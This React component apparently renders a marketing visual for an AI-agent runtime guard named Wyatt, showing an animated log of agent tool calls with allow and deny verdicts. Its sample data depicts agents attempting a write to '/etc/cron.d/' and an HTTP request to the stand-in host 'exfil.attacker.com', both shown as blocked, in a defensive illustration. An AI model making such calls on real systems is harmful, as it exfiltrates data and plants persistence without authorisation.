"use client";

import { motion } from "framer-motion";

const intercepts = [
  {
    ts: "14:32:01.441",
    agent: "sales-assistant-prod",
    call: "write_file('/etc/cron.d/new-job')",
    rule: "deny → fs.write.system",
    verdict: "DENY",
  },
  {
    ts: "14:32:02.118",
    agent: "data-analyst-v2",
    call: "execute_sql('SELECT * FROM users')",
    rule: "allow → db.read.authorized",
    verdict: "ALLOW",
  },
  {
    ts: "14:32:03.892",
    agent: "research-bot",
    call: "http_request('exfil.attacker.com/d')",
    rule: "deny → net.external.unknown",
    verdict: "DENY",
  },
  {
    ts: "14:32:05.210",
    agent: "sales-assistant-prod",
    call: "send_email(['team@acme.ai'])",
    rule: "allow → mail.internal",
    verdict: "ALLOW",
  },
];

export function RedteamVisual() {
  return (
    <div className="relative w-full h-full bg-slate-950 overflow-hidden font-mono">
      <div
        className="absolute inset-0 pointer-events-none opacity-[0.03]"
        style={{
          backgroundImage:
            "repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.03) 4px)",
        }}
      />

      <div className="flex flex-col h-full">
        {/* Header */}
        <div className="flex items-center justify-between px-3 py-2 border-b border-slate-800/40 bg-slate-900/30">
          <div className="flex items-center gap-2">
            <div className="w-2 h-2 rounded-full bg-amber-500 animate-pulse" />
            <span className="text-[10px] text-slate-400">WYATT · RUNTIME DAEMON · ACTIVE</span>
          </div>
          <div className="flex items-center gap-3 text-[9px]">
            <span className="text-red-400">2 denied</span>
            <span className="text-green-400">2 allowed</span>
          </div>
        </div>

        {/* Intercept log */}
        <div className="flex-1 overflow-hidden px-2 py-1.5 flex flex-col gap-1.5">
          {intercepts.map((item, i) => (
            <motion.div
              key={i}
              initial={{ opacity: 0, x: -10 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ duration: 0.3, delay: i * 0.2 }}
              className="border border-slate-800/30 px-2 py-1.5 bg-slate-900/20"
            >
              <div className="flex items-center justify-between mb-0.5">
                <span className="text-[8px] text-slate-600">{item.ts}</span>
                <span
                  className="text-[8px] font-bold px-1.5 py-0.5"
                  style={
                    item.verdict === "DENY"
                      ? { color: "#ef4444", backgroundColor: "rgba(239,68,68,0.08)" }
                      : { color: "#22c55e", backgroundColor: "rgba(34,197,94,0.08)" }
                  }
                >
                  {item.verdict}
                </span>
              </div>
              <p className="text-[9px] text-slate-300 truncate">{item.call}</p>
              <p className="text-[8px] text-slate-600 truncate mt-0.5">
                {item.agent} · {item.rule}
              </p>
            </motion.div>
          ))}
        </div>

        {/* Footer */}
        <div className="px-3 py-2 border-t border-slate-800/40 bg-slate-900/30 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <motion.div
              className="w-1.5 h-1.5 rounded-full bg-amber-500"
              animate={{ opacity: [1, 0.3, 1] }}
              transition={{ duration: 1.5, repeat: Infinity }}
            />
            <span className="text-[9px] text-slate-500">Deny by default · framework-agnostic</span>
          </div>
          <div className="flex items-center gap-1">
            <div className="w-12 h-1 bg-slate-800 rounded-full overflow-hidden">
              <motion.div
                className="h-full bg-amber-500/80 rounded-full"
                initial={{ width: "0%" }}
                animate={{ width: "100%" }}
                transition={{ duration: 8, ease: "linear" }}
              />
            </div>
            <span className="text-[9px] text-slate-600">live</span>
          </div>
        </div>
      </div>
    </div>
  );
}
